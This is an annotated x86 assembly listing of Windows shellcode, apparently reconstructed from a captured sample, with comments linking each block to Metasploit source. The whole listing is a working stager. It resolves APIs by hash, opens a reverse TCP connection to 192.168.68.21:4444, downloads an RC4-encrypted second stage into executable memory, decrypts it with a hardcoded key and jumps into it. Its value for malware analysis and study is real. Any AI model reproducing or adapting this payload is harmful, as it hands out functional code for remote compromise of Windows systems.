cld
call   0x88

; api_call implementation
; Pretty close to current version on GitHub:
;   https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm
; There are some slight differences in instruction choice (either due to using an older version, or due to disassembler quirks)
api_call:
    pusha
    mov    ebp,esp
    xor    eax,eax
    mov    edx,DWORD PTR fs:[eax+0x30]
    mov    edx,DWORD PTR [edx+0xc]
    mov    edx,DWORD PTR [edx+0x14]
next_mod:
    mov    esi,DWORD PTR [edx+0x28]
    movzx  ecx,WORD PTR [edx+0x26]
    xor    edi,edi
loop_modname:
    lods   al,BYTE PTR ds:[esi]
    cmp    al,0x61
    jl     not_lowercase
    sub    al,0x20
not_lowercase:
    ror    edi,0xd
    add    edi,eax
    loop   loop_modname
    push   edx
    push   edi
    mov    edx,DWORD PTR [edx+0x10]
    mov    ecx,DWORD PTR [edx+0x3c]
    mov    ecx,DWORD PTR [ecx+edx*1+0x78]
    jecxz  get_next_mod1
    add    ecx,edx
    push   ecx
    mov    ebx,DWORD PTR [ecx+0x20]
    add    ebx,edx
    mov    ecx,DWORD PTR [ecx+0x18]
get_next_func:
    jecxz  get_next_mod
    dec    ecx
    mov    esi,DWORD PTR [ebx+ecx*4]
    add    esi,edx
    xor    edi,edi
loop_funcname:
    lods   al,BYTE PTR ds:[esi]
    ror    edi,0xd
    add    edi,eax
    cmp    al,ah
    jne    loop_funcname
    add    edi,DWORD PTR [ebp-0x8]
    cmp    edi,DWORD PTR [ebp+0x24]
    jne    get_next_func
    pop    eax
    mov    ebx,DWORD PTR [eax+0x24]
    add    ebx,edx
    mov    cx,WORD PTR [ebx+ecx*2]
    mov    ebx,DWORD PTR [eax+0x1c]
    add    ebx,edx
    mov    eax,DWORD PTR [ebx+ecx*4]
    add    eax,edx
finish:
    mov    DWORD PTR [esp+0x24],eax
    pop    ebx
    pop    ebx
    popa
    pop    ecx
    pop    edx
    push   ecx
    jmp    eax

get_next_mod:
    pop    edi

get_next_mod1:
    pop    edi
    pop    edx
    mov    edx,DWORD PTR [edx]
    jmp    next_mod

; Reverse TCP implementation
; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm

reverse_tcp:
    push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
    push 0x5F327377        ; ...
    push esp               ; Push a pointer to the "ws2_32" string on the stack.
    push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
    call ebp               ; LoadLibraryA( "ws2_32" )
    mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
    sub esp, eax           ; alloc some space for the WSAData structure
    push esp               ; push a pointer to this stuct
    push eax               ; push the wVersionRequested parameter
    push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
    call ebp               ; WSAStartup( 0x0190, &WSAData );

    push eax               ; if we succeed, eax wil be zero, push zero for the flags param.
    push eax               ; push null for reserved parameter
    push eax               ; we do not specify a WSAPROTOCOL_INFO structure
    push eax               ; we do not specify a protocol
    inc eax                ;
    push eax               ; push SOCK_STREAM
    inc eax                ;
    push eax               ; push AF_INET
    push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
    call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
    xchg edi, eax          ; save the socket for later, don't care about the value of eax after this

set_address:
    push byte 0x05         ; retry counter
    push 0x1544a8c0        ; host 192.168.68.21
    push 0x5C110002        ; family AF_INET and port 4444
    mov esi, esp           ; save pointer to sockaddr struct
try_connect:
    push byte 16           ; length of the sockaddr struct
    push esi               ; pointer to the sockaddr struct
    push edi               ; the socket
    push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
    call ebp               ; connect( s, &sockaddr, 16 );

    test eax,eax           ; non-zero means a failure
    jz short connected

handle_failure:
    dec dword [esi+8]
    jnz short try_connect
failure:
    push 0x56A2B5F0        ; hardcoded to exitprocess for size
    call ebp

connected:
; Reading RC4-encrypted shellcode over the network
; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_recv_rc4.asm
recv:
    ; Receive the size of the incoming second stage...
    push byte 0            ; flags
    push byte 4            ; length = sizeof( DWORD );
    push esi               ; the 4 byte buffer on the stack to hold the second stage length
    push edi               ; the saved socket
    push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
    call ebp               ; recv( s, &dwLength, 4, 0 );
    ; Alloc a RWX buffer for the second stage
    mov esi, [esi]         ; dereference the pointer to the second stage length
      xor esi, "XORK"    ; XOR the stage length
      lea ecx, [esi+0x00]; ECX = stage length + S-box length (alloc length)
    push byte 0x40         ; PAGE_EXECUTE_READWRITE
    push 0x1000            ; MEM_COMMIT
      push ecx           ; push the alloc length
    push byte 0            ; NULL as we dont care where the allocation is.
    push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
    call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
      lea ebx, [eax+0x100] ; EBX = new stage address
    push ebx               ; push the address of the new stage so we can return into it
      push esi             ; push stage length
      push eax             ; push the address of the S-box
read_more:
    push byte 0            ; flags
    push esi               ; length
    push ebx               ; the current address into our second stage's RWX buffer
    push edi               ; the saved socket
    push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
    call ebp               ; recv( s, buffer, length, 0 );
    add ebx, eax           ; buffer += bytes_received
    sub esi, eax           ; length -= bytes_received, will set flags
    jnz read_more          ; continue if we have more to read
      pop ebx              ; address of S-box
      pop ecx              ; stage length
      pop ebp              ; address of stage
      push ebp             ; push back so we can return into it
      push edi             ; save socket
      mov edi, ebx         ; address of S-box
      call after_key       ; Call after_key, this pushes the address of the key onto the stack.
      db "killervulture123"
    after_key:
      pop esi

; RC4 decryption
; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_rc4.asm
  
    ; Initialize S-box
    xor eax, eax           ; Start with 0
init:
    stosb                  ; Store next S-Box byte S[i] = i
    inc al                 ; increase byte to write (EDI is increased automatically)
    jnz init               ; loop until we wrap around
    sub edi, 0x100         ; restore EDI

    ; permute S-box according to key
    xor ebx, ebx           ; Clear EBX (EAX is already cleared)
permute:
    add bl, [edi+eax]      ; BL += S[AL] + KEY[AL % 16]
    mov edx, eax
    and dl, 0xF
    add bl, [esi+edx]
    mov dl, [edi+eax]      ; swap S[AL] and S[BL]
    xchg dl, [edi+ebx]
    mov [edi+eax], dl
    inc al                 ; AL += 1 until we wrap around
    jnz permute


    ; decryption loop
    xor ebx, ebx           ; Clear EBX (EAX is already cleared)
decrypt:
    inc al                 ; AL += 1
    add bl, [edi+eax]      ; BL += S[AL]
    mov dl, [edi+eax]      ; swap S[AL] and S[BL]
    xchg dl, [edi+ebx]
    mov [edi+eax], dl
    add dl, [edi+ebx]      ; DL = S[AL]+S[BL]
    mov dl, [edi+edx]      ; DL = S[DL]
    xor [ebp], dl          ; [EBP] ^= DL
    inc ebp                ; advance data pointer
    dec ecx                ; reduce counter
    jnz decrypt            ; until finished
    
    pop edi              ; restore socket
  ret                    ; return into the second stage